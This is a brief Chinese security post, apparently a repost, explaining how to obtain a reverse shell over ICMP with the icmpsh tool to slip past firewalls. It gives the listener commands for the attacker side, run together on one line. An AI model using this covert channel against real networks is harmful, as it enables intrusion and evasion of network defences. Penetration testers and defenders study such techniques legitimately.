# 通过ICMP协议反弹SHELL并执行命令

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NjgzOTAyMg==&mid=2247485587&idx=2&sn=c736070a657297a5a3562e441b02b4ad&chksm=fc3fb192cb4838842674ae20bad3a9a5aa4e7ef1b7b51c28190267f2ad774b5ff08040e8c944&scene=126&sessionid=1681572536#rd](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247485587&idx=2&sn=c736070a657297a5a3562e441b02b4ad&chksm=fc3fb192cb4838842674ae20bad3a9a5aa4e7ef1b7b51c28190267f2ad774b5ff08040e8c944&scene=126&sessionid=1681572536#rd)

  

内网中的大多数系统都位于防火墙和企业代理之后，以便控制入口以及出口流量。防火墙可以拦截到反连的shell，但ICMP协议基本上是不拦截的。因此，为了获得shell并在目标主机上执行命令，可以使用ICMP协议作为隐藏通道进行连接。

  

使用icmpsh(https://github.com/inquisb/icmpsh)工具可用来执行此攻击。推特上的大牛@Bernardo Damele已经将其导入到他的工具sqlmap中，可以使用-os-pwn选项来发起攻击。

  

以下命令将禁止ICMP回显，这对于工具正常使用是至关重要的，启动一个监听器，该监听器将等待目标主机的ICMP数据包：

*   
*   

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1./icmpsh_m.py 192.168.100.3 192.168.100.4
```
